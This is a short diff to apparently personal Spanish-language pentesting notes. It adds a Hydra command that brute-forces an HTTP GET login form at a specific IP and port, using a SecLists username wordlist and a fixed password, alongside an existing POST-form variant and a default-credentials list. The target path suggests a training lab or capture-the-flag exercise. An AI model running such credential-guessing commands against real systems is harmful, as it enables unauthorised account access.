@@ -14,3 +14,6 @@ hydra -l user -P diccionario -f host/ip -s puerto http-post-form "path-to-login:
 
 Listas interesantes:
 ftp-betterdefaultpasslist.txt (seclist) credenciales user:pass
+
+login pot método get:
+hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -p minga -f 83.136.254.53 -s 53056 http-get-form "/question1:Username=^USER^&Password=^PASS^:Invalid username"
